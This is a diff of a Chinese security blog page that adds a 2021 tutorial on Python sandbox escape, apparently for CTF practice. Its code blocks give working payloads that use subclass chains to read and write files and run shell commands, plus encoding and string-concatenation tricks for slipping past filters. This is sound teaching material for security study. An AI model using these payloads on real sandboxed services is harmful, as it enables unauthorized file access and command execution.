@@ -1,12 +1,12 @@
 
 <html>
   <head lang="zh">
-         <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
+        <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
         <meta content="yes" name="apple-mobile-web-app-capable"/>
         <meta content="black" name="apple-mobile-web-app-status-bar-style"/>
         <meta content="telephone=no" name="format-detection"/>
         <meta name="renderer" content="webkit">
-    <title>P1and</title>
+    <title>python沙盒 | P1and</title>
 <link href="https://p1and.github.io/styles/main.css" type="text/css" rel="stylesheet"/>
 <script type="text/javascript" src="https://p1and.github.io/media/scripts/jquery.js"></script>
 <script type="text/javascript" src="https://p1and.github.io/media/scripts/basic.js"></script>
@@ -16,7 +16,7 @@
   </head>
 
   <body>
-    <div class="header">
+     <div class="header">
       <div class="logo_title">
 		  
         <div class="title animated fadeInDown"><img src="https://p1and.github.io/images/avatar.png?v=1625454064960"/>
@@ -123,107 +123,141 @@
     </div>
 
 
-
     <div class="main">
       <div class="main-inner">
 
 
 <div class="content">
+
+
+
+
+
+
+  <div class="post_page" >
+
+<div class="post">
+  <div class="post_title sm_margin">
+    <h2><a>python沙盒</a>
+
+
+
+    </h2>
+  </div>
+
+  <div class="post_details">
+    <div class="info"><i class="fa fa-clock-o"></i>
+<span class="date_info">2021-07-05</span>
+<i class="fa fa-eye"></i>
+
+<span class="date_info"><span id="busuanzi_value_page_pv"></span> Views</span>
+
+
+<i class="fa fa-bookmark-o"></i>
+<span class="tags_info weaklink">
 	
-	
-  <div class="list_with_title">
 
-    <div class="listing_title">2021</div>
-
-	  
-    <div class="listing">
-      <div class="listing-item">
-		  
-                                
-        <div class="listing_post"><a href="https://p1and.github.io/python-sha-he/"  title="python沙盒" >python沙盒</a>
-
-          <div class="post_date"><span class="date">2021-07-05</span>
-
-          </div>
-
-        </div>
- 
-                            
-                                
-        <div class="listing_post"><a href="https://p1and.github.io/lan-dui-zhi-su-yuan-fen-xi/"  title="蓝队溯源分析之新手养成记" >蓝队溯源分析之新手养成记</a>
-
-          <div class="post_date"><span class="date">2021-06-17</span>
-
-          </div>
-
-        </div>
- 
-                            
-                                
-        <div class="listing_post"><a href="https://p1and.github.io/360-tian-qing-qian-tai-sql-zhu-ru/"  title="360天擎-前台SQL注入" >360天擎-前台SQL注入</a>
-
-          <div class="post_date"><span class="date">2021-06-16</span>
-
-          </div>
-
-        </div>
- 
-                            
-                                
-                            
-      </div>
+</span>
 
 
-		
-		
-		
     </div>
-
 
   </div>
 
-  <div class="list_with_title">
-
-    <div class="listing_title">2018</div>
-
-	  
-    <div class="listing">
-      <div class="listing-item">
-		  
-                                
-                            
-                                
-                            
-                                
-                            
-                                
-        <div class="listing_post"><a href="https://p1and.github.io/hello-gridea/"  title="Hello Gridea" >Hello Gridea</a>
-
-          <div class="post_date"><span class="date">2018-12-12</span>
-
-          </div>
-
-        </div>
- 
-                            
-      </div>
 
 
-		
-		
-		
-    </div>
+
+
+  <div class="post_content markdown"><p class="md_block">
+    <span class="md_line md_line_start md_line_end"><p>所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。<br>
+python 沙箱逃逸的一些方法<br>
+我们通常所说的 Python 沙箱逃逸就是在给我们的一个代码执行环境下(Oj或使用socat生成的交互式终端),脱离种种过滤和限制,最终成功拿到shell权限的过程。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。<br>
+在 Python 的内置函数中，有一些函数可以帮助我们实现任意命令执行：</p>
+<pre><code>os.system()；os.popen()
+commands.getstatusoutput()；commands.getoutput()
+commands.getstatus()
+subprocess.call(command, shell=True)；subprocess.Popen(command, shell=True)
+pty.spawn()
+</code></pre>
+<h1 id="导入库文件函数">导入库文件（函数）</h1>
+<p>通常有三种方法导入库文件：</p>
+<pre><code>#  导入xxx库文件
+1、import xxx
+#  从xxx库文件导入所有类和函数，*代表所有类和函数
+2、from xxx import *
+#  动态加载xxx类和函数 
+3、__import__('xxx')
+</code></pre>
+<p>#python内置函数<br>
+当我们不能导入模块，或者想要导入的模块被禁，那么我们只能寻求 Python 本身内置函数（即通常不用人为导入，Python 本身默认已经导入的函数）。我们可以通过可以通过 <code>dir __builtin__</code>来获取内置函数列表：<br>
+<img src="https://p1and.github.io/post-images/1625452514842.png" alt="" loading="lazy"><br>
+从里面我们可以看到一些我们经常用到的函数：<code>open()</code>,<code>eval()</code>,<code>len()</code>,<code>__import__</code>,以及我们刚才用的<code>dir()</code>函数，还有我们要用的一些对象诸如<code>list</code>,<code>dict</code>,<code>tuple</code>,<code>int</code>,<code>float</code>这些，然后还有一些异常啥的。当然，这里面最关键的就是<code>__import__</code>了，可以使用import函数的话，就可以导入任意模块了。<br>
+如果一些 内敛函数在 builtins 删除 ，我们可以通过 reload(<strong>builtins</strong>) 重新载入获取一个完整的 builtins<br>
+常见payload：</p>
+<pre><code>#读文件
+().__class__.__bases__[0].__subclasses__()[40](r'C:\1.php').read()
+
+#写文件
+().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
+
+#执行任意命令
+().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()' )
+</code></pre>
+<p>Waf Bypass<br>
+当有的字符串被 waf 的时候可以通过编码或者字符串拼接绕过<br>
+base64：</p>
+<pre><code>().__class__.__bases__[0].__subclasses__()[40]('r','ZmxhZy50eHQ='.decode('base64')).read()
+相当于:
+().__class__.__bases__[0].__subclasses__()[40]('r','flag.txt')).read()
+</code></pre>
+<p>字符串拼接：</p>
+<pre><code>().__class__.__bases__[0].__subclasses__()[40]('r','fla'+'g.txt')).read()
+相当于
+().__class__.__bases__[0].__subclasses__()[40]('r','flag.txt')).read()
+</code></pre>
+<p>reload方法：</p>
+<pre><code>#  __import__是import语句调用的函数
+del __builtins__.__dict__['__import__'] 
+#  eval() 函数用来执行一个字符串表达式，并返回表达式的值。
+del __builtins__.__dict__['eval'] 
+#  执行文件内容
+del __builtins__.__dict__['execfile']
+</code></pre>
+<p>参考<br>
+https://www.runoob.com/<br>
+https://ctf-wiki.org/pwn/linux/sandbox/python-sandbox-escape/<br>
+https://blog.csdn.net/JBlock/article/details/82938656</p>
+</p>
+
+     <p class="md_block">
+    <div class="reward"><div class="reward-button">赏 <span class="reward-code"> <span class="alipay-code"> <img class="alipay-img" src="https://p1and.github.io/media/images/alipay.png"><b>支付宝扫码打赏</b> </span> <span class="wechat-code"> <img class="wechat-img" src="https://p1and.github.io/media/images/wechat.png"><b>微信打赏</b> </span> </span></div></div>
+</p> 
+</div>
+
+</div>
+
+
+
+<link href="https://p1and.github.io/styles/main.css" type="text/css" rel="stylesheet"/>
+
+<div class="doc_comments">
+
+</div>
+
 
 
   </div>
-
 </div>
 
 
 
       </div>
 
+
+
+
     </div>
+
    <div class="footer">
 <link href="https://p1and.github.io/styles/main.css" type="text/css" rel="stylesheet"/><div class="site_footer_wrap"><div class="site_footer">
 
@@ -316,7 +350,6 @@ a.back_to_top:hover span {
 })(this));
 </script>
 
- 
 </body>
 
 </html>
